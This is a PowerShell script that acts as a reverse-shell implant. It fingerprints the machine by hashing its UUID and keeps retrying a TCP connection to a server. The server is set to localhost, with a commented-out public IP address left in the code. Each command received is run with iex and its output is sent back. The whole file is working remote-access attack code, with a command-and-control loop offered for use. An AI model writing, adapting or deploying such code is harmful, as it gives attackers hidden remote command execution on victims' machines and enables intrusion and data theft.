# Get UUID of the machine.
try {
    $uuid = [System.Text.Encoding]::UTF8.GetBytes((Get-WMIObject Win32_ComputerSystemProduct).UUID);
} catch [System.Management.Automation.CommandNotFoundException] { # For testing on Linux.
    $uuid = [System.Text.Encoding]::UTF8.GetBytes((Get-Random));
}

# Calculate SHA-256 hash from UUID.
$hasher = [System.Security.Cryptography.HashAlgorithm]::Create("sha256");
$uuid = $hasher.ComputeHash($uuid);

# Preallocate byte array of sensible size with zeroes.
[byte[]] $bytes = 0..65535 | % {0};

# Loop indefinitely until "exit" command is issued.
while (1) {

    # Attempt to establish connection to server. Retry every 3 seconds.
    try {
        #$client = New-Object System.Net.Sockets.TCPClient("145.24.222.156", 5000);
        $client = New-Object System.Net.Sockets.TCPClient("localhost", 5000);
    } catch { # Catch ConstructorInvokedThrowException..
        Start-Sleep -s 3;
        continue;
    }

    # Initialize byte stream.
    $stream = $client.GetStream();

    # Send UUID as initial message.
    $out = $uuid
    $out = [System.BitConverter]::GetBytes([int64] $out.Length) + $out
    $stream.Write($out, 0, $out.Length);
    $stream.Flush();

    # Keep session established.
    while (1) {

        # Read bytes from stream and encode to ASCII.
        $in = $stream.Read($bytes, 0, $bytes.Length);
        $cmd = [System.Text.Encoding]::ASCII.GetString($bytes, 0, $in);

        # Retry in 2 seconds if there were nothing to read.
        if ($cmd -eq "") {
            Start-Sleep -s 2;
            continue;
        }
        # Close socket and exit on "exit" command.
        if ($cmd -eq "exit") {
            $client.Close();
            exit 1;
        }

        # Run command.
        $result = (iex $cmd 2>&1 | Out-String)

        # Send response.
        $out = [System.Text.Encoding]::UTF8.GetBytes($result);
        $out = [System.BitConverter]::GetBytes([int64] $out.Length) + $out
        $stream.Write($out, 0, $out.Length);
        $stream.Flush();
    }
}
